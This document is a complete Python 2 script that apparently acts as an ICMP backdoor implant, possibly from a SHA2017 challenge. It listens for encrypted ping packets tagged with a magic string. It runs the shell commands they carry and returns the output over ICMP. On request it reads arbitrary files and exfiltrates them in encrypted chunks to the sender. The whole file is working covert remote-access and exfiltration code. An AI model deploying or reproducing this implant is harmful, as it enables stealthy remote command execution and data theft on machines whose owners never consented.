#!/usr/bin/env python

import base64
import sys
import time
import subprocess
import threading

from Crypto import Random
from Crypto.Cipher import AES
from scapy.all import *

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]
magic = "SHA2017"


class AESCipher:

    def __init__( self, key ):
        self.key = key

    def encrypt( self, raw ):
        raw = pad(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) )

    def decrypt( self, enc ):
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc[16:] ))

def run_command(cmd):
    ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
    output = ps.communicate()[0]
    return output

def send_ping(host, magic, data):
    data = cipher.encrypt(data)
    load = "{}:{}".format(magic, data)
    time.sleep(1)
    sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)

def chunks(L, n):
    for i in xrange(0, len(L), n):
        yield L[i:i+n]

def get_file(host, magic, fn):
    time.sleep(1)
    data = base64.urlsafe_b64encode(open(fn, "rb").read())
    cnt = 0
    icmp_threads = []
    for line in chunks(data, 500):
        t = threading.Thread(target = send_ping, args = (host,magic, "getfile:{}:{}".format(cnt,line)))
        t.daemon = True
        t.start()
        icmp_threads.append(t)
        cnt += 1

    for t in icmp_threads:
        t.join()


cipher = AESCipher(sys.argv[1])

while True:
    try: 
        pkts = sniff(filter="icmp", timeout =5,count=1)

        for packet in pkts:
             if  str(packet.getlayer(ICMP).type) == "8": 
                input = packet[IP].load
                if input[0:len(magic)] == magic:
                    input = input.split(":")
                    data = cipher.decrypt(input[1]).split(":")
                    ip = packet[IP].src
                    if data[0] == "command":
                        output = run_command(data[1])
                        send_ping(ip, magic, "command:{}".format(output))
                    if data[0] == "getfile":
                        #print "[+] Sending file {}".format(data[1])
                        get_file(ip, magic, data[1])
    except:
        pass